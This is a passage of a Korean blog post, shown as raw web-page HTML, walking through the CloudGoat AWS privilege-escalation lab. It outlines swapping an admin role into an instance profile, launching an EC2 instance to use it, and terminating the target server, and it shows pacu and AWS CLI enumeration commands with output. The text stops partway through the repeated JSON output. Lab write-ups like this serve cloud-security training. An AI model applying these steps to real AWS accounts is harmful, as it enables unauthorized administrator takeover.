url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABV0lEQVQoz22R127CUBBELy22ce8dNwyYaogTFIm85P//aaJdhAQSD6Mtujs+uxZ+XMF0M6hWCNUModkRFC3gem7ee5wbAXQngqz5GE0sjKf2WwnDi6A5Aaayg/HMwlSyOU4+bEwkm+tHb6bc34iRycPvjEWSbdCuP5FmHRblnpUtdoiSFcJ4xfWyvcDza6haAsspoKgRxNh8T7ioDjj2N9Rtj3X3hc32G6vNwHnTnpHmHdbdgKbt4QU1HK9kw2e651zQF4nSdkt4QQPXr+CHDQ8TIdWGlcOwMn4jhA4hNDYhyocZRe4RxXD9w6obsD/+sLrdlc9Asb/84nS+oWxOKOsjn2CuxZAUH5ISYCZ5r4R5sePBojqgXvY8VDUnzoNoyVS0NilO10jzLdMTuRc20M3s1VCeB/wDSGRA61JOkcxUPWHpZgpVj2HaOWy34BNoRooP2X9Z+x/v78fOsV1suQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/8d79af64ad9f8b715dd67b8b69581204/37523/0.png\"\n        srcset=\"/static/8d79af64ad9f8b715dd67b8b69581204/e9ff0/0.png 180w,\n/static/8d79af64ad9f8b715dd67b8b69581204/f21e7/0.png 360w,\n/static/8d79af64ad9f8b715dd67b8b69581204/37523/0.png 720w,\n/static/8d79af64ad9f8b715dd67b8b69581204/c1328/0.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyklEQVQI1y3OzU6DQAAAYRJtaqPVRNNLQwW2FCh/29KyLLsEQjWePJgmvfr+bzEmxMN3mdM40g357kcyWVOrHlV3pPXAIu8RImUXlWy8mECkeH6CF+wJdwXbMCeKJXFWkfoF14eK28ri+JsEoy8kqaKQlvJgyaVBRBVhdGSfqamJUOKLkmBbsnxxeVyueXpeM1+suJu9Mr9/mzgqKvm93mjMiNIDrR44dl+4ww/y0ExO5w7bfaLbkdZe0Gak0QO2+0CeDMl79n9o+AN7Sls7SI82CwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/bee1d92425d022ca91e3f1b7d86cde74/37523/1.png\"\n        srcset=\"/static/bee1d92425d022ca91e3f1b7d86cde74/e9ff0/1.png 180w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/f21e7/1.png 360w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/37523/1.png 720w,\n/static/bee1d92425d022ca91e3f1b7d86cde74/efc66/1.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ol>\n<li>공격자는 IAM 사용자 “Kerrigan”으로 시작하여 높은 수준의 접근제어 권한에서 취약점 분석을 진행합니다.</li>\n<li>공격자는 먼저 EC2 인스턴스를 조회하면서 <code class=\"language-text\">cg-super-critical-security-server</code>을 식별은 하지만 대상에 직접 영향을 줄 수 가 없기 때문에 다른 방향으로 접근합니다.</li>\n<li>공격자는 계정 내의 기존 인스턴스 프로필과, 역활들을 Enum 하고 사용할 수 있는 인스턴스 프로필과 Rule을 결정합니다.</li>\n<li>때를 기다리던 공격자는 전체 관리자 역활을 인스턴스 프로필로 변경합니다.</li>\n<li>다음으로 공격자는 새로운 EC2 Key-Pair를 생성합니다.</li>\n<li>공격자는 해당 key-pari으로 새로운 EC2 인스턴스를 생성함으로써 셸 접근 권한이 생기게 되었습니다.</li>\n<li>익스플로잇의 마지막 단계에로서 공격자는 전체적인 관리자 권한이 부여된 인스턴스 프로필을 EC2 인스턴스에 연결을 합니다.</li>\n<li>새로운 EC2 인스턴스에 액세스 하고 스테이징 플랫폼으로 사용함으로써 공격자는 연결된 프로필의 역활에 의해 부여된 전체 관리자 권한으로 AWS CLI 명령을 실행할 수 있습니다.</li>\n<li>공격자는 “cg-super-critical-security-server” EC2 인스턴스를 종료하여 시나리오를 완료할 수 있습니다.</li>\n</ol>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"kerrigan-iam-profile\" style=\"position:relative;\"><a href=\"#kerrigan-iam-profile\" aria-label=\"kerrigan iam profile permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kerrigan IAM Profile</h3>\n<ul>\n<li>해당 환경에서 AWS Security Credential 정보가 있는 것을 확인할 수 있습니다.  해당 정보를 토대로 enum를 수행하려는 경우 첫 번째 단계는 AWS CLI를 사용해서 Security Credential 새로 생서하는 것입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxklEQVQY042QyQ6CQBBER9zYRrZhGdlEVMQFDSEeNMb4/x9VxjbxKB6qK33ol65iIlgikGvIuIIflojTGvOkxmrTYmanUI0QuhlBGTkYDG3yX2KuKAiW5nuSKxYw+JyOGeMfDWZgivUXlKl6iLZ7oDnfcG7vpO7yxKG5Isl2sN0MlpOBW/EX9gvK3qMoT6j3F1R1R5Hz4ki+KBvIZAvPL/CuZqoFYErPhwaX4FYCEZTUoePl0IwIE9UngG5K2jUzwngqeiO/ALLQeH72UtYxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/401003a28174efafcdd68d8b0a877161/37523/2.png\"\n        srcset=\"/static/401003a28174efafcdd68d8b0a877161/e9ff0/2.png 180w,\n/static/401003a28174efafcdd68d8b0a877161/f21e7/2.png 360w,\n/static/401003a28174efafcdd68d8b0a877161/37523/2.png 720w,\n/static/401003a28174efafcdd68d8b0a877161/4b446/2.png 877w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>pacu 도구를 사용하여 <code class=\"language-text\">aws__enum__account</code> 정보를 토대로 <code class=\"language-text\">kerrigan</code> 사용자의 aws accountid와 동일하지를 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABjUlEQVQoz2WOWXOaYABFv2hrmhYENC4sn0tEQGQTRRC3NiZ9sP//95xOmLYvfThz79yHO0d405CXeUR/MMdyAgZjl+F4ycj0eB4tmq0/dNEGLp2nEaKl0fpkNDy09X/9L2K6SLFlyGS2JsvPrOOKNL+w2V4JwoKi/MEqrtkd7wwt/7+DD9p/aA5NGWI6K0w7IEpq/HBPHFesVgXLYEecHgmjiqJ8ZennGP0ZmjFBtHSEUBBCRbS7iAcF0dYQxXpLWZyIkj316Y3j4Tve6Y5Mz+RZSbqpidOPPPCyiLCcJXIa4EiP2TxEzgKKJ4+7miMfJeIU5twu7ySbI/nuQlFc8TdnHDcjWG0JoxLXy7AcHzlZMTJdurqDZkh0Q6JqNoOOifw6RekMEYe85ufbL7bFhd3+SlVeCE53guqdJNo1hof61thX9StFeSXNDmSbmiSrGuPsi8tNSbA6NsI3LNzJEq0n6eo2mmbR6c34rDlN/6aOUVSTrmahdk003cboT9B7kt7ztMF5dPCUBXpnxG/PhsHnSbF6iQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/6e36a6c33077f06366a996b361838082/37523/3.png\"\n        srcset=\"/static/6e36a6c33077f06366a996b361838082/e9ff0/3.png 180w,\n/static/6e36a6c33077f06366a996b361838082/f21e7/3.png 360w,\n/static/6e36a6c33077f06366a996b361838082/37523/3.png 720w,\n/static/6e36a6c33077f06366a996b361838082/c6bbc/3.png 910w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 AWS 정보를 이용하여 enumeration 정보를 확인해 봤습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>\ncloudgoat_output_kerrigan_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_kerrigan_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span></code></pre></div>\n<ul>\n<li>AWS Security Credential을 토대로 enumeration 한 결과 좀더 조사할 가치가 있음을 확인하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABIElEQVQoz22RWW+DMBCEHXKgUiAJN4aGI9xQcpOqVVW1//8/TWRHaaDpw8i7D/vN7JoEUQPTSWD7BYKgRkhL+E6KiFagNIflpnC9Asrch2mvuWyaQV34IMIcwmQ5ECnrM8K45UrzA+JshzDZIKtOcL0cFjNzU8xEg9dZcYSseiCjO2w0XtyB63SHIHrFKmw4lPUMnGR7UJ8l8yDJLiYzDZoRYrP/hCQ7v+n6MA7cHb5QNW8o6w5N+452+4HT+QfH7htF1UF8MkFGKgewhMysD3kAsnV0M4ZmRDCsmNcOzWDaCZ4Vtzc4h25G8FcVCJG4wQ02WJkQ5ZqAidxe5SpheKelHuAlbLghq6ei/pjw7y/9JzY0nmp85TjZ8lv30/eBF3CGrDYVtXmVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/6c3fdb1852b6f336da6a6f80736e8781/37523/4.png\"\n        srcset=\"/static/6c3fdb1852b6f336da6a6f80736e8781/e9ff0/4.png 180w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/f21e7/4.png 360w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/37523/4.png 720w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/302a4/4.png 1080w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/07a9c/4.png 1440w,\n/static/6c3fdb1852b6f336da6a6f80736e8781/1d499/4.png 1632w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시나리오 최종 목푱니 EC2 머신인 ‘cg-super-critical-security-server’ 가 사용 가능하지를 확인해봤습니다. AWS Rule은 EC2 태그를 검색할 수 있도록 태그 키가 “Name”인 태그에 EC2 인스턴스의 이름을 추가로 넣는 것 입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABg0lEQVQoz1WR3XKaYBCGMTE2qT8oioYfIcgHChgBjYMxiK02babtUXoBvYPe/9nT8cvEaQ+eeXdP3t13V7lPt4zdOfpIYNozLMmUu8nirfcSXJHiTBaE0we0roPatmh1LJptk5vmLbXLLhf1nlSl2BzYbI+U1Qu76hsP5Qv35Xfy5RPe3Zy5FrFx1kSjkLEp0HQP/VZgWFNsJ5ZDrz4MzqbK4fiDfPVEMM1IkiUi3zHKD0RxjudGPNYDvjRTkvqIQWtA40anca3LzU5btlVL9mfDKCnw/ExOMu2IIFySxGsWWYk7WdAzBS3dpW+GGHYkjZRaB+VCfdNa5//I6+KI56cywglfZHj+AhEusZyYjuagDT0Zta9PuP44RPnH4F3fUdK8JJyt8IMcP8iI0y2zbEe2LBFBxlgThEaCMxQYhqDZMaVJvdGXXF5pZ2TkXfWVYrOnrJ7ZPu7JP/3E+/xKtX9mtz3y2z3yJ3nlV1CwilLaXRu159A/PWfkow08WbdVW973Lxiqvkr85GspAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/a653e43979712bfe1e9a5076a43c00d2/37523/5.png\"\n        srcset=\"/static/a653e43979712bfe1e9a5076a43c00d2/e9ff0/5.png 180w,\n/static/a653e43979712bfe1e9a5076a43c00d2/f21e7/5.png 360w,\n/static/a653e43979712bfe1e9a5076a43c00d2/37523/5.png 720w,\n/static/a653e43979712bfe1e9a5076a43c00d2/636c2/5.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABm0lEQVQoz22Sy27bMBBF8//LAC3yDwW6b1dBs8imQDdpF61lUS9SpCyLEl962bcY2grS1AQuiCFHh3NndHc6nUAruAGPPzt8eJrx8M3h/jHg83eNg6pRcQEuBOpagnMBIWpIKePZoW1xPp0jw3uPuw3YdR3SlKEqCuQsRZ4x8KpEUZTYJXvsGUNVVUiSPZIkRVlxpIxBSoVt/QM0xkLUNfp+gO57HI8dBmMwDAOMtbDOwTiP3jgMxqLTGm3bou8NzucbFfoQ4kcUr+uKdd32i5ZlweIHrK7DMlos1/NpmvDKeAukC3kQKFWOXDJkMkVWpyhUhvrIIZoS5fMnsK8fUfz4An5sIRoBqVSE/wcMIUTL1OhNgnbOozXnPawPFzkf3cQ2GPMeePE/zXPsF/UvhDEmd52G1hpN08D7EF2M43jVFGMq5KZlSqoqHqfqrINqGuySFIKLOFka0DzPMW+6QjfgegtIF2VZgmU5rLVQSuH3n1184OXlF7TusWzAaXrVDeDFMr1OvweJkqhnVBXBqRWUTLDwRhT7d5b/AkdH/F4AAiZsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/bdd69477c9fdf17136fd8ea7833a8072/37523/6.png\"\n        srcset=\"/static/bdd69477c9fdf17136fd8ea7833a8072/e9ff0/6.png 180w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/f21e7/6.png 360w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/37523/6.png 720w,\n/static/bdd69477c9fdf17136fd8ea7833a8072/f4b77/6.png 770w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws ec2 describe-instances --query <span class=\"token string\">'Reservations[*].Instances[*].[Tags]'</span> <span class=\"token punctuation\">\\</span>\n--profile kerrigan</code></pre></div>\n<ul>\n<li>aws cli 기능에는 <code class=\"language-text\">query</code> 옵션을 통해서 출력 형식 json 배열의 모든 출력값을 필터링 할 수 있습니다. <code class=\"language-text\">Reservations[*].Instances[*].[Tags]</code> 형태로 <code class=\"language-text\">*</code> 와일드카드 형태로 표현식을 작성할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span>...skipping...\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span 